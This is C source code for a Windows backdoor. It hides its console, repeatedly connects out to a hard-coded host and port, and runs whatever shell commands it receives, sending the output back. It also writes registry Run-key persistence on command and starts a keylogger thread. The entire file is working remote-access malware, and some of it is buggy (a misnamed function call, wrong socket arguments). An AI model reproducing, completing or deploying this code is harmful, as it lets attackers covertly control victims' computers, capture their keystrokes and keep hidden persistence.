#include<stdio.h>
#include<Windows.h>
#include<string.h>
#include<winsock2.h>
#include<stdlib.h>
#include<winuser.h>
#include<wininet.h>
#include<windowsx.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<keylogger.h>

int sock;

int bootRun() {

	CHAR error[128] = "Failed\n";
	CHAR success[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD dwPathLen = 0;
	DWORD dwPathLenInBytes = dwPathLen * sizeof(*szPath); // convert the pathlen to its size in bytes
	HKEY hKey;


	dwPathLen = GetModuleFileName(NULL, szPath,MAX_PATH);
	if (dwPathLen == 0) {
		send(sock, error, sizeof(error));
		return -1;
	}
	
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) != ERROR_SUCCESS) {

		send(sock, error, sizeof(error));
		return -1;
	}

	if (RegSetValueEx(hKey, TEXT("Config"), 0, REG_SZ, (LPBYTE)szPath, dwPathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		send(sock, error, sizeof(error));
		return -1;
	}

	RegCloseKey(hKey);
	send(sock, success, sizeof(success));
	return 0;



}

char* str_cut(char str[], int slice_from, int slice_to)
{
	if (str[0] == '\0')
		return NULL;

	char* buffer;
	size_t str_len, buffer_len;

	if (slice_to < 0 && slice_from > slice_to) {
		str_len = strlen(str);
		if (abs(slice_to) > str_len - 1)
			return NULL;

		if (abs(slice_from) > str_len)
			slice_from = (-1) * str_len;

		buffer_len = slice_to - slice_from;
		str += (str_len + slice_from);
	}
	else if (slice_from >= 0 && slice_to > slice_from) {
		str_len = strlen(str);
		if (slice_from > str_len - 1)
			return NULL;

		buffer_len = slice_to - slice_from;
		str += slice_from;
	}
	else
		return NULL;

	buffer = calloc(buffer_len, sizeof(char));
	strncpy(buffer, str, buffer_len);
	return buffer;
}


void shell() {

	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (TRUE) {

		jump:
		memset(buffer, 0, sizeof(buffer));
		memset(buffer, 0, sizeof(container));
		memset(buffer, 0, sizeof(total_response));

		recv(sock, buffer, sizeof(buffer), 0);

		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}else if(strncmp("cd ", buffer, 3) == 0) {
			chdir(str_cut(buffer, 3, 100));
		}
		else if (strncmp("persist", buffer, 7) == 0) {

			boolRun();
		}
		else if(strncmp("keylogger", buffer, 9) == 0){

			HANDLE hThread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
			goto jump;
		}
		else {

			FILE* fp;
			fp = _popen(buffer, "r"); // execute the command

			while (fgets(container, 1024, fp) != NULL){
				strcat(total_response, container);
			}

			send(sock, total_response, sizeof(total_response), 0); //send the response to the server
			fclose(fp);
			

		}
	}
	

}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	HWND hWnd; 
	unsigned short ServPort;
	char *ServIp;

	// allocate a new console window
	AllocConsole();
	hWnd = findWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);

	struct sockaddr_in ServAddr;			// structur that holds the server info's
	WSADATA wsaData;						// structur that hold socket info's when its initialized

	ServIp = "192.168.43.214";
	ServPort = 44444;


	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0 ){
		exit(1);
	}

	// create a socket object
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));

	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIp);
	ServAddr.sin_port = htons(ServPort);

	//trying to connect to the server
	start:
	while (connect(sock, (struct sockaddr*)&ServAddr, sizeof(ServAddr)) !=0 ) {

		Sleep(10);
		goto start;

	}

	shell();
	

	










}